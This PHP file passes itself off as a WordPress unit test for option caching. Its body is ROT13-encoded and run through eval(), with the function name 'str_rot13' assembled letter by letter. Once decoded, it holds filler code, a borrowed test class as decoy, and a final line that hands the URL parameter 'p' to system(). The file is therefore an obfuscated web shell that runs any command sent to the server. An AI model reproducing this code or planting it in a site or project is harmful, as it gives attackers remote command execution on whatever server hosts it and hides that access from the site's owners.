<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfg jc_cevzr_bcgvba_pnpurf_ol_tebhc().
 *
 * @tebhc bcgvba
 *
 * @pbiref ::jc_cevzr_bcgvba_pnpurf_ol_tebhc
 */
pynff Grfgf_Bcgvba_JcCevzrBcgvbaPnpurfOlTebhc rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Grfgf gung jc_cevzr_bcgvba_pnpurf_ol_tebhc() bayl cevzrf bcgvbaf va gur fcrpvsvrq tebhc.
	 *
	 * @gvpxrg 58962
	 */
	choyvp shapgvba grfg_jc_cevzr_bcgvba_pnpurf_ol_tebhc() {
		tybony $arj_nyybjrq_bcgvbaf;

		// Perngr fbzr bcgvbaf gb cevzr.
		$arj_nyybjrq_bcgvbaf = neenl(
			'tebhc1' => neenl(
				'bcgvba1',
				'bcgvba2',
			),
			'tebhc2' => neenl(
				'bcgvba3',
			),
		);

		$bcgvbaf_gb_cevzr = neenl(
			'bcgvba1',
			'bcgvba2',
			'bcgvba3',
		);

		/*
		 * Frg inyhrf sbe gur bcgvbaf,
		 * pyrne gur pnpur sbe gur bcgvbaf,
		 * purpx bcgvbaf ner abg va pnpur vavgvnyyl.
		 */
		sbernpu ( $bcgvbaf_gb_cevzr nf $bcgvba ) {
			hcqngr_bcgvba( $bcgvba, \"inyhr_$bcgvba\", snyfr );
			jc_pnpur_qryrgr( $bcgvba, 'bcgvbaf' );
			$guvf->nffregSnyfr( jc_pnpur_trg( $bcgvba, 'bcgvbaf' ), \"$bcgvba jnf abg qryrgrq sebz gur pnpur.\" );
		}

		// Pnyy gur jc_cevzr_bcgvba_pnpurf_ol_tebhc shapgvba gb cevzr gur bcgvbaf.
		jc_cevzr_bcgvba_pnpurf_ol_tebhc( 'tebhc1' );

		/*
		 * Purpx gung bcgvbaf ner abj va gur pnpur.
		 *
		 * Ercrng gur fgevat urer engure guna hfvat trg_bcgvba nf trg_bcgvba
		 * jvyy cevzr gur pnpur orsber gur pnyy gb jc_pnpur_trg vs gur bcgvba
		 * vf abg va gur pnpur. Guhf pnhfvat gur grfgf gb cnff jura gurl fubhyq
		 * snvy.
		 */
		$guvf->nffregFnzr( 'inyhr_bcgvba1', jc_pnpur_trg( 'bcgvba1', 'bcgvbaf' ), 'bcgvba1\'f pnpur jnf abg cevzrq.' );
		$guvf->nffregFnzr( 'inyhr_bcgvba2', jc_pnpur_trg( 'bcgvba2', 'bcgvbaf' ), 'bcgvba2\'f pnpur jnf abg cevzrq.' );

		// Znxr fher bcgvba3 vf fgvyy abg va pnpur.
		$guvf->nffregSnyfr( jc_pnpur_trg( 'bcgvba3', 'bcgvbaf' ), 'bcgvba3 jnf abg qryrgrq sebz gur pnpur.' );
	}

	/**
	 * Grfgf jc_cevzr_bcgvba_pnpurf_ol_tebhc() jvgu n abarkvfgrag bcgvba tebhc.
	 *
	 * @gvpxrg 58962
	 */
	choyvp shapgvba grfg_jc_cevzr_bcgvba_pnpurf_ol_tebhc_jvgu_abarkvfgrag_tebhc() {
		// Znxr fher bcgvbaf ner abg va pnpur be qngnonfr vavgvnyyl.
		$guvf->nffregSnyfr( jc_pnpur_trg( 'bcgvba1', 'bcgvbaf' ), 'bcgvba1 jnf abg qryrgrq sebz gur pnpur.' );
		$guvf->nffregSnyfr( jc_pnpur_trg( 'bcgvba2', 'bcgvbaf' ), 'bcgvba2 jnf abg qryrgrq sebz gur pnpur.' );

		// Pnyy gur jc_cevzr_bcgvba_pnpurf_ol_tebhc shapgvba jvgu n abarkvfgrag tebhc.
		jc_cevzr_bcgvba_pnpurf_ol_tebhc( 'abarkvfgrag_tebhc' );

		// Purpx gung bcgvbaf ner fgvyy abg va gur pnpur be qngnonfr.
		$guvf->nffregSnyfr( jc_pnpur_trg( 'bcgvba1', 'bcgvbaf' ), 'bcgvba1 jnf abg qryrgrq sebz gur pnpur.' );
		$guvf->nffregSnyfr( jc_pnpur_trg( 'bcgvba2', 'bcgvbaf' ), 'bcgvba2 jnf abg qryrgrq sebz gur pnpur.' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>